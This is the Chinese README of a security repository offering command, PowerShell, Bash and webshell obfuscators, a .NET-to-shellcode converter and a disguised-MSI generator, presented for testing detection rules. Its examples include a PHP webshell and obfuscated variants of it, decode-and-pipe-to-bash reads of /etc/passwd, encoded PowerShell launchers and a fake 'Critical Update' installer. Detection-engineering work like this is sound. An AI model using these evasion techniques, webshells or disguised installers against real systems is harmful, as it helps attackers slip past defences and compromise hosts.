# sec-skills

[English](./README.md) | [中文](./README_zh.md)

---

安全研究 Skills 仓库，专注于防御性安全研究工具集。

> **Purpose**: 帮助安全研究人员生成用于测试检测能力的样本命令，支持红蓝对抗演练和检测规则开发。

## Skills

| Skill | Description |
|-------|-------------|
| [cmd-obfuscate](./docs/cmd-obfuscate.md) | cmd.exe 命令混淆工具 (Invoke-DOSfuscation) |
| [powershell-obfuscate](./docs/powershell-obfuscation.md) | PowerShell 命令混淆工具 (Invoke-Obfuscation) |
| [webshell-obfuscate](./docs/webshell-obfuscation.md) | Webshell 混淆工具 (PHP/JSP/ASP.NET) |
| [bash-obfuscate](./docs/bash-obfuscation.md) | Bash 命令混淆工具 (Bashfuscator) |
| [donut](./docs/donut.md) | .NET 程序集转 Shellcode (TheWover/donut) |
| [msi-generator](./docs/msi-generator.md) | MSI 安装包生成工具 (msilib) |

## 效果示例

### cmd-obfuscate - 命令混淆
```bash
$ python3 cmd-obfuscate/cmd_obfuscation.py "netstat -ano" --technique all

[{"technique": "envvar", "command": "cmd /C \"n%PUBLIC:~5,1%%TEMP:~23,1%stat...\""},
 {"technique": "concat", "command": "cmd /V:ON /C \"set X=net&&set Y=stat&&call %X%%Y%\""},
 {"technique": "reverse", "command": "cmd /V:ON /C \"FOR /L %i in (11,-1,0) DO set var=!var!!str:~%i,1!\""}]
```
生成立即执行的混淆命令，用于测试 EDR 对 cmd.exe 混淆的检测能力。

### powershell-obfuscate - PowerShell 混淆
```bash
$ python3 powershell-obfuscate/powershell_obfuscation.py "Write-Host 'Hello'" --encoding all

[{"technique": "base64", "command": "powershell -NoP -NonI -Enc SABoAGUAbABvACAAJwBJAG4AaABlACcA"},
 {"technique": "hex", "command": "powershell -NoP -NonI -Command \"&({0})\" -f [char[]]@(72,101,108,108,111)"},
 {"technique": "bxor", "command": "powershell -NoP -NonI -Command \"IEX $(...)\""}]
```
8 种编码 + 9 种 Launcher 技术，测试 PowerShell 检测规则。

### bash-obfuscate - Bash 混淆
```bash
$ python3 bash-obfuscate/bash_obfuscation.py "cat /etc/passwd" --technique base64

[{"technique": "base64", "command": "echo \"Y2F0IC9ldGMvcGFzc3dk\" | base64 -d | bash"},
 {"technique": "hex", "command": "echo -e \"\\x63\\x61\\x74\" | xxd -r -p | bash"},
 {"technique": "rot13", "command": "echo 'png /etc/cngf' | tr 'a-z' 'n-za-m' | bash"}]
```
15 种混淆技术，测试 Linux 命令检测规则。

### webshell-obfuscate - Webshell 混淆
```bash
$ python3 webshell-obfuscate/webshell_obfuscation.py "<?php system(\$_GET['cmd']);?>" --lang php --technique all

[{"technique": "base64", "output": "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"},
 {"technique": "hex", "output": "3c3f7068702073797374656d... (truncated)"},
 {"technique": "concat", "output": "<?php $a='sys'.'tem';$a($_GET['cmd']); ?>"}]
```
支持 PHP/JSP/ASP.NET，测试 WAF 检测规则。

### donut - .NET 转 Shellcode
```bash
$ python3 donut/donut.py generate malicious.exe -c Namespace.Class -m Main
$ python3 donut/donut.py detect "cb2f6723-ab3a-11d2-9c40"

[{"pattern": "DONUT_CLR_GUID", "severity": "high", "match": "cb2f6723-ab3a-11d2-9c40"}]
```
将 .NET 程序集转换为 Shellcode，测试内存扫描检测。

### msi-generator - MSI 安装包
```bash
$ python3 msi-generator/msi_generator.py generate-suspicious "Critical Update.msi" "calc.exe"

Suspicious MSI created: Critical Update.msi
Detection hints:
  - Suspicious product name: Critical Update
  - Suspicious manufacturer: Microsoft Update
  - Hidden payload execution
```
生成可疑 MSI 样本，测试安装包检测规则。

## 目录结构

```
sec-skills/
├── README.md, README_zh.md
├── CLAUDE.md
├── .gitignore
├── cmd-obfuscate/          # cmd.exe 混淆
├── powershell-obfuscate/   # PowerShell 混淆
├── webshell-obfuscate/     # Webshell 混淆
├── bash-obfuscate/         # Bash 混淆
├── donut/                  # .NET → Shellcode
├── msi-generator/          # MSI 安装包
└── docs/                   # 各模块文档
```

## 快速使用

```bash
# 混淆命令测试 EDR 规则
python3 cmd-obfuscate/cmd_obfuscation.py "netstat -ano" --technique all
python3 powershell-obfuscate/powershell_obfuscation.py "Get-Process" --encoding hex
python3 bash-obfuscate/bash_obfuscation.py "cat /etc/passwd" --technique all

# 生成混淆 webshell
python3 webshell-obfuscate/webshell_obfuscation.py "<?php system(\$_GET['cmd']);?>" --lang php --technique all

# .NET 程序集转 Shellcode
python3 donut/donut.py generate malicious.exe -c Namespace.Class -m Main

# 生成 MSI 安装包
python3 msi-generator/msi_generator.py generate output.msi -n MyApp -f myapp.exe
```

## 免责声明

本仓库所有工具仅用于**授权的防御性安全研究**、**红蓝对抗演练**和**检测规则开发**。

请勿将本仓库中的工具用于任何未经授权的恶意活动。所有使用者需自行承担使用本工具的风险和责任。
